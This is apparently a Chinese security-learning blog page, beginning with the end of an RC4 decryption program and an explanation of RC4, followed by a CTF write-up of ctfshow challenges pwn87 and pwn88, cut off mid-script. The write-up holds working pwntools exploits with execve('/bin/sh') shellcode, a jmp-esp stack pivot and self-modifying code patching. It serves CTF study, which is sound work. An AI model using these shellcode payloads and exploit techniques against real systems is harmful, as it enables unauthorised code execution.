&#x27;%c&#x27;\n&quot;</span>, hex_cipher[i]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为二进制</span></span><br><span class="line">    <span class="type">size_t</span> cipher_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* ciphertext = hex2bin(hex_cipher, &amp;cipher_len);</span><br><span class="line">    <span class="keyword">if</span> (!ciphertext || cipher_len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 十六进制转换失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配解密缓冲区</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* decrypted = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(cipher_len + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!decrypted) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;错误: 内存分配失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(ciphertext);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密过程</span></span><br><span class="line">    RC4_CTX ctx;</span><br><span class="line">    rc4_init(&amp;ctx, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(&amp;ctx, ciphertext, decrypted, cipher_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保字符串终止</span></span><br><span class="line">    decrypted[cipher_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n解密结果:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密钥: %s\n&quot;</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文(HEX): %s\n&quot;</span>, hex_cipher);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密文本: %s\n&quot;</span>, decrypted);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理内存</span></span><br><span class="line">    <span class="built_in">free</span>(ciphertext);</span><br><span class="line">    <span class="built_in">free</span>(decrypted);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n按 Enter 键退出...&quot;</span>);</span><br><span class="line">    getchar();  <span class="comment">// 忽略返回值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里来详细了解一下标准rc4</p>
<p><strong>算法概述</strong>：RC4（Rivest Cipher 4）是由Ron Rivest在1987年设计的流密码算法，被广泛应用于SSL&#x2F;TLS、WEP等协议中。它是一种对称</p>
<p>加密算法，使用相同的密钥进行加密和解密。</p>
<p><strong>核心组件</strong>：</p>
<ol>
<li>S盒（State Box）</li>
</ol>
<ul>
<li>256字节的数组（0-255）</li>
<li>初始化为顺序值：<code>S[0]=0, S[1]=1, ..., S[255]=255</code></li>
</ul>
<ol start="2">
<li>密钥调度算法（KSA）</li>
</ol>
<ul>
<li>使用密钥初始化S盒</li>
<li>伪代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i from <span class="number">0</span> to <span class="number">255</span>:</span><br><span class="line">    j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">    swap(S[i], S[j])</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>伪随机生成算法（PRGA）</li>
</ol>
<ul>
<li>生成密钥流字节</li>
<li>伪代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">swap(S[i], S[j])</span><br><span class="line">K = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line"><span class="keyword">return</span> K</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><h3 id="加密-解密过程"><a href="#加密-解密过程" class="headerlink" title="加密&#x2F;解密过程"></a>加密&#x2F;解密过程</h3><ul>
<li>明文&#x2F;密文与密钥流字节异或</li>
<li><code>ciphertext_byte = plaintext_byte XOR K</code></li>
<li><code>plaintext_byte = ciphertext_byte XOR K</code></li>
</ul>
</li>
</ol>
<h3 id="详细加密流程"><a href="#详细加密流程" class="headerlink" title="详细加密流程"></a>详细加密流程</h3><ol>
<li>步骤1: 密钥调度（KSA）</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(RC4_CTX *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">size_t</span> key_len)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = (<span class="type">unsigned</span> <span class="type">char</span>)i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重置索引</span></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用密钥打乱S盒</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + ctx-&gt;S[i] + key[i % key_len]) % <span class="number">256</span>;</span><br><span class="line">        <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>KSA简而言之就是先初始化S盒在用key打乱S盒。</p>
<ol start="2">
<li>步骤2: 生成密钥流字节(PRGA)</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">rc4_generate_byte</span><span class="params">(RC4_CTX *ctx)</span> &#123;</span><br><span class="line">    <span class="comment">// 更新索引</span></span><br><span class="line">    ctx-&gt;i = (ctx-&gt;i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    ctx-&gt;j = (ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]) % <span class="number">256</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 交换S[i]和S[j]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">    ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 计算密钥流字节</span></span><br><span class="line">    <span class="keyword">return</span> ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) % <span class="number">256</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PRGA简而言之生成密钥流</p>
<ol start="3">
<li>步骤3: 加密数据</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(RC4_CTX *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *input, </span></span><br><span class="line"><span class="params">               <span class="type">unsigned</span> <span class="type">char</span> *output, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> n = <span class="number">0</span>; n &lt; len; n++) &#123;</span><br><span class="line">        <span class="comment">// 生成密钥流字节并与输入字节异或</span></span><br><span class="line">        output[n] = input[n] ^ rc4_generate_byte(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：我可以发现只要得到秘钥流就可以通过密文和秘钥流异或得到明文，当然这个用的时候得保证这个异或没有被魔改。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/27/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/27/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">花式栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-27 10:09:37" itemprop="dateCreated datePublished" datetime="2025-07-27T10:09:37+08:00">2025-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:12:24" itemprop="dateModified" datetime="2025-09-23T21:12:24+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pwn87"><a href="#pwn87" class="headerlink" title="pwn87"></a>pwn87</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">28</span>]; <span class="comment">// [esp+8h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> fgets(s, 50, stdin);存在栈溢出漏洞。</p>
<p>50 - 0x20 - 0x04 &#x3D; 14</p>
<p>可利用的空间不足，要利用栈迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=pwn --only=&#x27;jmp|ret&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~$ ROPgadget --binary=pwn --only=&#x27;jmp|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048bcf : jmp 0x2825346b</span><br><span class="line">0x080483bb : jmp 0x80483a0</span><br><span class="line">0x08048534 : jmp 0x80484c0</span><br><span class="line">0x08048612 : jmp 0x8048613</span><br><span class="line">0x08048624 : jmp 0x8048625</span><br><span class="line">0x08048636 : jmp 0x8048637</span><br><span class="line">0x0804866c : jmp 0x804866d</span><br><span class="line">0x080485f3 : jmp 0x8c0485f5</span><br><span class="line">0x080485ca : jmp 0xf05585ce</span><br><span class="line">0x080485dc : jmp 0xf05585e0</span><br><span class="line">0x08048d17 : jmp esp</span><br><span class="line">0x0804837a : ret</span><br><span class="line">0x080484ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>

<p>找到0x08048d17 : jmp esp</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接远程服务器</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28287</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置上下文为 32 位（i386）</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 ELF 文件</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 x86 shellcode（注意前面加 b 表示 bytes）</span></span><br><span class="line">shellcode_x86 = (</span><br><span class="line">    <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 sub esp, 0x28; jmp esp 的机器码</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28; jmp esp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定地址（需根据实际程序确认）</span></span><br><span class="line">jmp_esp = <span class="number">0x08048d17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload = shellcode_x86</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86))  <span class="comment"># 填充到 0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;bbbb&#x27;</span>                             <span class="comment"># ebp</span></span><br><span class="line">payload += p32(jmp_esp)                        <span class="comment"># 覆盖返回地址</span></span><br><span class="line">payload += sub_esp_jmp                         <span class="comment"># 跳转指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下疑惑点，当执行到p32(jmp_esp)；由于函数返回时执行leave ret;leave:pop ebp 是esp会指向ebp + 4 也就是 sub_esp_jmp；然</p>
<p>后esp 转到 esp - 0x28的位置，也就是s的起始位置；jmp esp使得esp指向s的起始位置,ret使得esp指向eip，执行shellcode。</p>
<h2 id="pwn88"><a href="#pwn88" class="headerlink" title="pwn88"></a>pwn88</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where What?&quot;</span>);</span><br><span class="line">  v5 = __isoc99_scanf(<span class="string">&quot;%llx %d&quot;</span>, v6, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)v6[<span class="number">0</span>] = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">0xFF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No flag for you&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到可以用v4来修改v6这个内存地址。</p>
<p>这个只有一次读入肯定是不够的，所以要构造一个循环</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">text:00000000004006F2                 push    rbp</span><br><span class="line">.text:00000000004006F3                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006F6                 sub     rsp, 20h</span><br><span class="line">.text:00000000004006FA                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400703                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400707                 xor     eax, eax</span><br><span class="line">.text:0000000000400709                 mov     rax, cs:__bss_start</span><br><span class="line">.text:0000000000400710                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000400715                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000400718                 call    _setbuf</span><br><span class="line">.text:000000000040071D                 mov     edi, offset format ; &quot;Where What?&quot;</span><br><span class="line">.text:0000000000400722                 mov     eax, 0</span><br><span class="line">.text:0000000000400727                 call    _printf</span><br><span class="line">.text:000000000040072C                 lea     rdx, [rbp+var_18]</span><br><span class="line">.text:0000000000400730                 lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000400734                 mov     rsi, rax</span><br><span class="line">.text:0000000000400737                 mov     edi, offset aLlxD ; &quot;%llx %d&quot;</span><br><span class="line">.text:000000000040073C                 mov     eax, 0</span><br><span class="line">.text:0000000000400741                 call    ___isoc99_scanf</span><br><span class="line">.text:0000000000400746                 mov     [rbp+var_14], eax</span><br><span class="line">.text:0000000000400749                 cmp     [rbp+var_14], 2</span><br><span class="line">.text:000000000040074D                 jz      short loc_400756</span><br><span class="line">.text:000000000040074F                 mov     eax, 0</span><br><span class="line">.text:0000000000400754                 jmp     short loc_400778</span><br><span class="line">.text:0000000000400756 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400756</span><br><span class="line">.text:0000000000400756 loc_400756:                             ; CODE XREF: main+5B↑j</span><br><span class="line">.text:0000000000400756                 mov     rax, [rbp+var_10]</span><br><span class="line">.text:000000000040075A                 mov     edx, [rbp+var_18]</span><br><span class="line">.text:000000000040075D                 mov     [rax], dl</span><br><span class="line">.text:000000000040075F                 mov     eax, [rbp+var_18]</span><br><span class="line">.text:0000000000400762                 cmp     eax, 0FFh</span><br><span class="line">.text:0000000000400767                 jnz     short loc_400773</span><br><span class="line">.text:0000000000400769                 mov     edi, offset s   ; &quot;No flag for you&quot;</span><br><span class="line">.text:000000000040076E                 call    _puts</span><br><span class="line">.text:0000000000400773</span><br><span class="line">.text:0000000000400773 loc_400773:                             ; CODE XREF: main+75↑j</span><br><span class="line">.text:0000000000400773                 mov     eax, 0</span><br><span class="line">.text:0000000000400778</span><br><span class="line">.text:0000000000400778 loc_400778:                             ; CODE XREF: main+62↑j</span><br><span class="line">.text:0000000000400778                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:000000000040077C                 xor     rcx, fs:28h</span><br><span class="line">.text:0000000000400785                 jz      short locret_40078C</span><br><span class="line">.text:0000000000400787                 call    ___stack_chk_fail</span><br><span class="line">.text:000000000040078C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040078C</span><br><span class="line">.text:000000000040078C locret_40078C:                          ; CODE XREF: main+93↑j</span><br><span class="line">.text:000000000040078C                 leave</span><br><span class="line">.text:000000000040078D                 retn</span><br></pre></td></tr></table></figure>



<p>再汇编中我们可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400767                 jnz     short loc_400773；</span><br></pre></td></tr></table></figure>

<p>我们可以利用这个使得其调回到000000000040071D到达printf的地址进行二次输入。第二次输入（修改<code>jnz</code>为<code>jmp</code>）达到无条件转跳，</p>
<p>从而达到循环。</p>
<p>然后利用单字节写入在0x0000000000400769写入shellcode，最后再利用修改jmp转跳到shellcode的地址来执行shellcode。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标程序（根据需求选择一种连接方式）</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="string">&#x27;28194&#x27;</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text_addr = <span class="number">0x400767</span>  <span class="comment"># 需要修改的关键指令地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">addr, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;向指定地址写入数据（实际只修改最低字节）&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Where What?&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span> <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：修改跳转偏移（保留原指令结构）</span></span><br><span class="line"><span class="comment"># 将jnz指令的偏移改为0xB6（-0x4A的补码）</span></span><br><span class="line">jnz_offset = u32(asm(<span class="string">&#x27;jnz $-0x4A&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_data(text_addr + <span class="number">1</span>, jnz_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：修改操作码为jmp（短跳转）</span></span><br><span class="line">jmp_opcode = u32(asm(<span class="string">&#x27;jmp $-0x4A&#x27;</span>)[<span class="number">0</span>:<span class="number">1</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_data(text_addr, jmp_opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步：在text+2位置注入shellcode</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x68732f6e69622f  # &quot;/bin/sh&quot;的十六进制</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp     # 文件名参数</span></span><br><span class="line"><span class="string">    mov rax, 59      # execve系统调用号</span></span><br><span class="line"><span class="string">    xor rsi, rsi     # argv = NULL</span></span><br><span class="line"><span class="string">    xor rdx, rdx     # envp = NULL</span></span><br><span class="line"><span class="string">   